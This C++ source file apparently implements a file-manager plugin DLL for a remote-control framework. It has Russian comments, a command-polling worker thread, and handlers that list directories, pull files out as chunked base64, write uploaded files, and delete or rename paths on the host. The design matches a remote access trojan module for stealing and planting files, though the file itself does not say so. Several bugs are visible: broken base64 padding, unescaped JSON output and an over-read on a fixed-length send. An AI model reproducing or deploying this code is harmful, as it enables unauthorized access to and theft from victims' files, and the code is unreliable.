// Modules/FileManager/filemgr.cpp — STABLE & FIXED VERSION
// Компиляция: cl /LD /MT /O2 filemgr.cpp /Fe:filemgr.dll kernel32.lib user32.lib

#include "filemgr.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <cstdint>

static volatile bool g_running = false;
static ModuleAPI* g_api = nullptr;

// Логирование
void fm_log(const char* msg) {
    if (!msg) return;
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE h = CreateFileA("C:\\temp\\filemgr.log", GENERIC_WRITE, FILE_SHARE_READ,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
    }
    if (g_api && g_api->log) g_api->log(msg);
}

// ============================================================================
// Base64 (Исправлены операторы << и >>)
// ============================================================================
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* Base64Encode(const unsigned char* data, size_t len, size_t* out_len) {
    if (!data || len == 0) { *out_len = 0; return nullptr; }
    size_t encoded_len = 4 * ((len + 2) / 3);
    char* out = (char*)HeapAlloc(GetProcessHeap(), 0, encoded_len + 1);
    if (!out) { *out_len = 0; return nullptr; }

    size_t i = 0, j = 0;
    while (i < len) {
        uint32_t octet_a = i < len ? data[i++] : 0;
        uint32_t octet_b = i < len ? data[i++] : 0;
        uint32_t octet_c = i < len ? data[i++] : 0;
        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        out[j++] = b64_table[(triple >> 18) & 0x3F];
        out[j++] = b64_table[(triple >> 12) & 0x3F];
        out[j++] = (i > len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        out[j++] = (i > len) ? '=' : b64_table[triple & 0x3F];
    }
    out[j] = '\0'; *out_len = j; return out;
}

unsigned char* Base64Decode(const char* data, size_t* out_len) {
    if (!data || !out_len) { *out_len = 0; return nullptr; }
    size_t len = strlen(data);
    if (len % 4 != 0) { *out_len = 0; return nullptr; }

    size_t padding = 0;
    if (len >= 2 && data[len-1] == '=') padding++;
    if (len >= 3 && data[len-2] == '=') padding++;
    size_t decoded_len = (len / 4) * 3 - padding;

    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, decoded_len + 1);
    if (!out) { *out_len = 0; return nullptr; }

    static unsigned char b64_map[256] = {0}; static bool initialized = false;
    if (!initialized) {
        for (int i = 0; i < 64; i++) b64_map[(unsigned char)b64_table[i]] = i;
        initialized = true;
    }

    size_t i = 0, j = 0;
    while (i < len) {
        uint32_t sextet_a = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
        uint32_t sextet_b = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
        uint32_t sextet_c = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
        uint32_t sextet_d = (i < len && data[i] != '=') ? b64_map[(unsigned char)data[i++]] : 0;
        uint32_t triple = (sextet_a << 18) | (sextet_b << 12) | (sextet_c << 6) | sextet_d;

        if (j < decoded_len) out[j++] = (triple >> 16) & 0xFF;
        if (j < decoded_len) out[j++] = (triple >> 8) & 0xFF;
        if (j < decoded_len) out[j++] = triple & 0xFF;
    }
    out[decoded_len] = '\0'; *out_len = decoded_len; return out;
}

// ============================================================================
// JSON Helpers (Исправлено экранирование кавычек И переполнение буфера)
// ============================================================================
void SendJsonError(ModuleAPI* api, const char* cmd, const char* msg) {
    if (!api || !api->send_result) return;
    char buf[1024];
    sprintf_s(buf, "{\"cmd\":\"%s\",\"error\":\"%s\"}\n", cmd, msg);
    api->send_result((const unsigned char*)buf, (unsigned long long)strlen(buf));
}

void SendJsonResult(ModuleAPI* api, const char* cmd, const char* data) {
    if (!api || !api->send_result) return;
    
    // 🔑 КРИТИЧЕСКИЙ ФИКС: Выделяем память динамически, так как data может быть огромной (System32)
    size_t data_len = strlen(data);
    size_t buf_size = data_len + 128;
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, buf_size);

    if (buf) {
        sprintf_s(buf, buf_size, "{\"cmd\":\"%s\",\"result\":%s}\n", cmd, data);
        api->send_result((const unsigned char*)buf, (unsigned long long)strlen(buf));
        HeapFree(GetProcessHeap(), 0, buf);
    }
}

// ============================================================================
// Обработчики
// ============================================================================
void HandleDir(const char* path, ModuleAPI* api) {
    fm_log("HandleDir started.\n");
    if (!path || !api) return;
    char search_path[MAX_PATH];
    sprintf_s(search_path, "%s\\*", path);

    WIN32_FIND_DATAA fdata;
    HANDLE hFind = FindFirstFileA(search_path, &fdata);
    if (hFind == INVALID_HANDLE_VALUE) {
        char err[256]; sprintf_s(err, "Failed to open dir (Err:%lu)", GetLastError());
        SendJsonError(api, "dir", err); return;
    }

    // ✅ БЕЗОПАСНОСТЬ: Динамическая память (256 КБ)
    size_t buf_size = 256 * 1024;
    char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
    if (!json) { SendJsonError(api, "dir", "Mem alloc failed"); FindClose(hFind); return; }

    strcpy_s(json, buf_size, "[");
    bool first = true;

    do {
        if (!first) {
            if (strlen(json) + 2 > buf_size) break;
            strcat_s(json, buf_size, ",");
        }
        first = false;

        SYSTEMTIME st; FILETIME lt;
        FileTimeToLocalFileTime(&fdata.ftLastWriteTime, &lt);
        FileTimeToSystemTime(&lt, &st);
        ULARGE_INTEGER sz = { fdata.nFileSizeLow, fdata.nFileSizeHigh };

        char entry[1024];
        sprintf_s(entry, "{\"name\":\"%s\",\"type\":\"%s\",\"size\":%llu,\"modified\":\"%04d-%02d-%02d %02d:%02d\"}",
            fdata.cFileName, (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "dir" : "file",
            sz.QuadPart, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        if (strlen(json) + strlen(entry) + 2 > buf_size) {
            fm_log("Dir output truncated (buffer full)\n");
            break;
        }
        strcat_s(json, buf_size, entry);

    } while (FindNextFileA(hFind, &fdata));

    strcat_s(json, buf_size, "]");
    FindClose(hFind);
    SendJsonResult(api, "dir", json);
    HeapFree(GetProcessHeap(), 0, json);
    fm_log("HandleDir finished.\n");
}

void HandleGet(const char* filepath, ModuleAPI* api) {
    if (!filepath || !api) return;
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256]; sprintf_s(err, "Cannot open file (Err:%lu)", GetLastError());
        SendJsonError(api, "get", err); return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL); CloseHandle(hFile);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) { SendJsonResult(api, "get", "\"\""); return; }

    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buffer) { SendJsonError(api, "get", "Mem alloc failed"); return; }

    HANDLE hF = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD rd=0; ReadFile(hF, buffer, fileSize, &rd, NULL); CloseHandle(hF);

    size_t b64len=0; char* b64 = Base64Encode(buffer, fileSize, &b64len); HeapFree(GetProcessHeap(), 0, buffer);
    if (!b64) { SendJsonError(api, "get", "B64 failed"); return; }

    // Отправляем данные
    // Для больших файлов отправляем чанками
    const size_t CHUNK = 32768;
    if (b64len <= CHUNK) {
        char* json = (char*)HeapAlloc(GetProcessHeap(), 0, b64len + 128);
        if(json) {
            sprintf_s(json, b64len + 128, "{\"cmd\":\"get\",\"data\":\"%s\"}", b64);
            api->send_result((const unsigned char*)json, (unsigned long long)strlen(json));
            api->send_result((const unsigned char*)"\n", 1);
            HeapFree(GetProcessHeap(), 0, json);
        }
    } else {
        size_t off=0; int n=0; int tot=(int)((b64len+CHUNK-1)/CHUNK);
        while(off < b64len) {
            size_t len = (b64len-off < CHUNK) ? (b64len-off) : CHUNK;
            char* hdr = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
            int hlen = sprintf_s(hdr, 64, "FILE_CHUNK#%d/%d:\n", n, tot);
            api->send_result((const unsigned char*)hdr, hlen);
            api->send_result((const unsigned char*)(b64+off), len);
            off+=len; n++; Sleep(10);
            HeapFree(GetProcessHeap(), 0, hdr);
        }
    }
    HeapFree(GetProcessHeap(), 0, b64);
}

void HandlePut(const char* filepath, const char* base64_data, ModuleAPI* api) {
    if (!filepath || !base64_data || !api) return;
    size_t dlen=0; unsigned char* data = Base64Decode(base64_data, &dlen);
    if (!data) { SendJsonError(api, "put", "Decode failed"); return; }
    HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { HeapFree(GetProcessHeap(), 0, data); SendJsonError(api, "put", "Create failed"); return; }
    DWORD wr=0; WriteFile(hFile, data, (DWORD)dlen, &wr, NULL); CloseHandle(hFile); HeapFree(GetProcessHeap(), 0, data);
    SendJsonResult(api, "put", "\"OK\"");
}

void HandleDel(const char* path, ModuleAPI* api) {
    DWORD attrs = GetFileAttributesA(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) { SendJsonError(api, "del", "Path not found"); return; }
    BOOL ok = (attrs & FILE_ATTRIBUTE_DIRECTORY) ? RemoveDirectoryA(path) : DeleteFileA(path);
    if (!ok) { char err[256]; sprintf_s(err, "Delete failed (Err:%lu)", GetLastError()); SendJsonError(api, "del", err); }
    else SendJsonResult(api, "del", "\"OK\"");
}

void HandleRename(const char* o, const char* n, ModuleAPI* api) {
    if (!MoveFileA(o, n)) SendJsonError(api, "rename", "Rename failed"); else SendJsonResult(api, "rename", "\"OK\"");
}

void HandleMkdir(const char* p, ModuleAPI* api) {
    if (!CreateDirectoryA(p, NULL)) SendJsonError(api, "mkdir", "Create failed"); else SendJsonResult(api, "mkdir", "\"OK\"");
}

void HandleInfo(const char* p, ModuleAPI* api) {
    WIN32_FILE_ATTRIBUTE_DATA fd;
    if (!GetFileAttributesExA(p, GetFileExInfoStandard, &fd)) { SendJsonError(api, "info", "Attr failed"); return; }
    ULARGE_INTEGER sz = { fd.nFileSizeLow, fd.nFileSizeHigh };
    SYSTEMTIME st; FILETIME lt; FileTimeToLocalFileTime(&fd.ftLastWriteTime, &lt); FileTimeToSystemTime(&lt, &st);
    char* json = (char*)HeapAlloc(GetProcessHeap(), 0, 512);
    if(json) {
        sprintf_s(json, 512, "{\"name\":\"%s\",\"size\":%llu,\"attrs\":%lu,\"modified\":\"%04d-%02d-%02d %02d:%02d\"}",
            p, sz.QuadPart, fd.dwFileAttributes, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
        SendJsonResult(api, "info", json);
        HeapFree(GetProcessHeap(), 0, json);
    }
}

// ============================================================================
// Парсинг команд
// ============================================================================
void ProcessCommand(const char* cmd, ModuleAPI* api) {
    if (!cmd || !api) return;
    while (*cmd == ' ') cmd++; if (!*cmd) return;
    if (strncmp(cmd, "filemgr:", 8) == 0) { cmd += 8; while (*cmd == ' ') cmd++; }

    char name[64]={0}, a1[MAX_PATH]={0}, a2[65536]={0};
    int p = sscanf_s(cmd, "%63s %259[^ \t\n] %65535[^\n]", name, (DWORD)sizeof(name), a1, (DWORD)sizeof(a1), a2, (DWORD)sizeof(a2));
    if (p < 1) return;

    if (strcmp(name, "dir")==0) HandleDir(p >=2 ? a1 : ".", api);
    else if (strcmp(name, "get")==0 && p >=2) HandleGet(a1, api);
    else if (strcmp(name, "put")==0 && p >=3) HandlePut(a1, a2, api);
    else if (strcmp(name, "del")==0 && p >=2) HandleDel(a1, api);
    else if (strcmp(name, "rename")==0 && p >=3) HandleRename(a1, a2, api);
    else if (strcmp(name, "mkdir")==0 && p >=2) HandleMkdir(a1, api);
    else if (strcmp(name, "info")==0 && p >=2) HandleInfo(a1, api);
    else SendJsonError(api, "filemgr", "Unknown cmd");
}

// ============================================================================
// Поток и Запуск
// ============================================================================
DWORD WINAPI WorkerThread(LPVOID param) {
    g_api = (ModuleAPI*)param;
    g_running = true;
    fm_log("Worker thread started.\n");
    g_api->send_result((const unsigned char*)"FILEMGR_READY:File manager loaded\n", 37);

    while (g_running) {
        const char* cmd = g_api->get_command("filemgr");
        if (cmd && strlen(cmd) > 0) ProcessCommand(cmd, g_api);
        Sleep(50);
    }
    fm_log("Worker thread stopped.\n");
    return 0;
}

extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api || !api->send_result) return -1;
    HANDLE h = CreateThread(NULL, 0, WorkerThread, api, 0, NULL);
    if (!h) return -1;
    CloseHandle(h);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    if (r == DLL_PROCESS_DETACH) { g_running = false; }
    return TRUE;
}